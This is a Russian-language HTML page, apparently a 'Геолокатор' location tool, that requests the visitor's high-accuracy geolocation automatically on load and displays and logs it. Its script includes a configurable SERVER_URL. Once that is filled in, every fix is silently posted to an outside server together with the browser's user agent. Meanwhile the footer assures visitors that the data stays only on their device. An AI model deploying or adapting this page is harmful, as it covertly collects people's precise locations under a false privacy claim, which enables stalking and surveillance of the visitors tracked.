<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📍 Геолокатор</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Arial, sans-serif;
            background: #0d1117;
            color: #c9d1d9;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #161b22;
            border-radius: 20px;
            padding: 35px 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 8px 30px rgba(0,0,0,0.6);
            border: 1px solid #30363d;
        }
        .header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 25px;
        }
        .header .icon { font-size: 32px; }
        .header h1 { font-size: 22px; font-weight: 600; color: #f0f6fc; }
        .header .badge {
            background: #238636;
            color: white;
            font-size: 11px;
            padding: 2px 12px;
            border-radius: 20px;
            font-weight: 500;
            margin-left: auto;
        }
        .status-block {
            background: #0d1117;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 20px;
            border: 1px solid #30363d;
            min-height: 80px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        .status-block .status-text {
            font-size: 15px;
            color: #8b949e;
        }
        .status-block .status-text.success { color: #3fb950; }
        .status-block .status-text.error { color: #f85149; }
        .status-block .coords {
            font-family: 'Courier New', monospace;
            font-size: 18px;
            color: #f0883e;
            margin-top: 8px;
            word-break: break-all;
        }
        .status-block .accuracy {
            font-size: 13px;
            color: #8b949e;
            margin-top: 4px;
        }
        .loader {
            display: inline-block;
            width: 28px;
            height: 28px;
            border: 3px solid #30363d;
            border-top: 3px solid #58a6ff;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
            margin-bottom: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }
        .btn {
            flex: 1;
            padding: 10px 16px;
            border: none;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: 0.2s;
            min-width: 100px;
        }
        .btn-primary {
            background: #238636;
            color: white;
        }
        .btn-primary:hover { background: #2ea043; }
        .btn-secondary {
            background: #21262d;
            color: #c9d1d9;
            border: 1px solid #30363d;
        }
        .btn-secondary:hover { background: #30363d; }
        .btn-danger {
            background: #da3633;
            color: white;
        }
        .btn-danger:hover { background: #f85149; }
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .footer {
            margin-top: 20px;
            font-size: 12px;
            color: #484f58;
            text-align: center;
            border-top: 1px solid #21262d;
            padding-top: 16px;
        }
        .footer a {
            color: #58a6ff;
            text-decoration: none;
        }
        .log-area {
            margin-top: 15px;
            background: #0d1117;
            border-radius: 8px;
            padding: 10px;
            max-height: 120px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 12px;
            color: #8b949e;
            border: 1px solid #21262d;
            display: none;
        }
        .log-area.show { display: block; }
        .log-area .entry {
            padding: 2px 0;
            border-bottom: 1px solid #161b22;
        }
        .copy-btn {
            background: #1f6feb;
            color: white;
            border: none;
            padding: 4px 12px;
            border-radius: 6px;
            font-size: 12px;
            cursor: pointer;
            margin-left: 8px;
        }
        .copy-btn:hover { background: #388bfd; }
        @media (max-width: 480px) {
            .container { padding: 20px 16px; }
            .header h1 { font-size: 18px; }
            .btn { font-size: 13px; padding: 8px 12px; }
        }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <span class="icon">📍</span>
        <h1>Геолокатор</h1>
        <span class="badge">Live</span>
    </div>

    <div class="status-block" id="statusBlock">
        <div class="loader" id="loader"></div>
        <div class="status-text" id="statusText">Определение геолокации...</div>
        <div class="coords" id="coordsDisplay">—</div>
        <div class="accuracy" id="accuracyDisplay"></div>
    </div>

    <div class="btn-group">
        <button class="btn btn-primary" id="btnGet" onclick="getLocation()">🔄 Обновить</button>
        <button class="btn btn-secondary" id="btnCopy" onclick="copyCoords()">📋 Копировать</button>
        <button class="btn btn-danger" id="btnClear" onclick="clearCoords()">🗑️ Очистить</button>
    </div>

    <div class="log-area" id="logArea">
        <div style="display:flex; justify-content:space-between; margin-bottom:6px;">
            <span>📋 История</span>
            <button class="copy-btn" onclick="copyLog()">Копировать всё</button>
        </div>
        <div id="logEntries"></div>
    </div>

    <div class="footer">
        ⚡ Данные только на этом устройстве • 
        <a href="#" onclick="toggleLog()">Показать историю</a>
    </div>
</div>

<script>
    // ★ НАСТРОЙКА: если хочешь отправлять координаты на свой сервер — укажи URL ★
    const SERVER_URL = "";  // пример: "https://ваш-сервер.com/location"

    let lastCoords = null;
    let history = [];

    function getLocation() {
        const statusText = document.getElementById('statusText');
        const coordsDisplay = document.getElementById('coordsDisplay');
        const accuracyDisplay = document.getElementById('accuracyDisplay');
        const loader = document.getElementById('loader');
        const btn = document.getElementById('btnGet');

        statusText.textContent = '⏳ Запрос разрешения...';
        statusText.className = 'status-text';
        coordsDisplay.textContent = '—';
        accuracyDisplay.textContent = '';
        loader.style.display = 'inline-block';
        btn.disabled = true;

        if (!navigator.geolocation) {
            statusText.textContent = '❌ Браузер не поддерживает геолокацию';
            statusText.className = 'status-text error';
            loader.style.display = 'none';
            btn.disabled = false;
            return;
        }

        navigator.geolocation.getCurrentPosition(
            function(pos) {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                lastCoords = { lat, lon, acc };
                history.push({ lat, lon, acc, time: new Date().toLocaleTimeString() });

                coordsDisplay.textContent = `${lat.toFixed(6)}, ${lon.toFixed(6)}`;
                accuracyDisplay.textContent = `±${Math.round(acc)} м`;
                statusText.textContent = '✅ Геолокация получена!';
                statusText.className = 'status-text success';
                loader.style.display = 'none';
                btn.disabled = false;

                if (SERVER_URL) {
                    fetch(SERVER_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: lat,
                            lon: lon,
                            accuracy: acc,
                            userAgent: navigator.userAgent,
                            timestamp: Date.now()
                        })
                    }).catch(() => {});
                }

                updateLog();
            },
            function(err) {
                let msg = '';
                switch(err.code) {
                    case 1: msg = '❌ Доступ запрещён! Разрешите геолокацию в браузере.'; break;
                    case 2: msg = '❌ Сигнал недоступен. Проверьте GPS/WiFi.'; break;
                    case 3: msg = '❌ Таймаут. Попробуйте обновить страницу.'; break;
                    default: msg = '❌ Ошибка: ' + err.message;
                }
                statusText.textContent = msg;
                statusText.className = 'status-text error';
                coordsDisplay.textContent = '—';
                accuracyDisplay.textContent = '';
                loader.style.display = 'none';
                btn.disabled = false;
            },
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
        );
    }

    function copyCoords() {
        if (!lastCoords) {
            alert('Нет координат для копирования');
            return;
        }
        const text = `${lastCoords.lat.toFixed(6)}, ${lastCoords.lon.toFixed(6)}`;
        navigator.clipboard?.writeText(text).then(() => {
            const btn = document.getElementById('btnCopy');
            const orig = btn.textContent;
            btn.textContent = '✅ Скопировано!';
            setTimeout(() => btn.textContent = orig, 1500);
        }).catch(() => {
            alert('Не удалось скопировать. Скопируйте вручную:\n' + text);
        });
    }

    function clearCoords() {
        if (!lastCoords && history.length === 0) return;
        lastCoords = null;
        history = [];
        document.getElementById('coordsDisplay').textContent = '—';
        document.getElementById('accuracyDisplay').textContent = '';
        document.getElementById('statusText').textContent = '🔄 Данные очищены';
        document.getElementById('statusText').className = 'status-text';
        document.getElementById('logEntries').innerHTML = '';
        document.getElementById('logArea').classList.remove('show');
    }

    function updateLog() {
        const entries = document.getElementById('logEntries');
        entries.innerHTML = history.map(h =>
            `<div class="entry">${h.time} → ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} (±${Math.round(h.acc)} м)</div>`
        ).join('');
    }

    function toggleLog() {
        const area = document.getElementById('logArea');
        area.classList.toggle('show');
        if (area.classList.contains('show')) updateLog();
    }

    function copyLog() {
        if (history.length === 0) {
            alert('Нет записей в истории');
            return;
        }
        const text = history.map(h =>
            `${h.time} | ${h.lat.toFixed(6)}, ${h.lon.toFixed(6)} | ±${Math.round(h.acc)} м`
        ).join('\n');
        navigator.clipboard?.writeText(text).catch(() => {});
        alert('📋 История скопирована в буфер обмена');
    }

    window.onload = function() {
        try {
            const saved = sessionStorage.getItem('geo_history');
            if (saved) {
                history = JSON.parse(saved);
                if (history.length > 0) {
                    const last = history[history.length - 1];
                    lastCoords = { lat: last.lat, lon: last.lon, acc: last.acc };
                    document.getElementById('coordsDisplay').textContent =
                        `${last.lat.toFixed(6)}, ${last.lon.toFixed(6)}`;
                    document.getElementById('accuracyDisplay').textContent =
                        `±${Math.round(last.acc)} м (из кеша)`;
                    document.getElementById('statusText').textContent = '📌 Из кеша';
                    document.getElementById('statusText').className = 'status-text';
                }
            }
        } catch(e) {}

        setTimeout(getLocation, 500);
    };

    setInterval(() => {
        try {
            sessionStorage.setItem('geo_history', JSON.stringify(history));
        } catch(e) {}
    }, 3000);
</script>
</body>
</html>
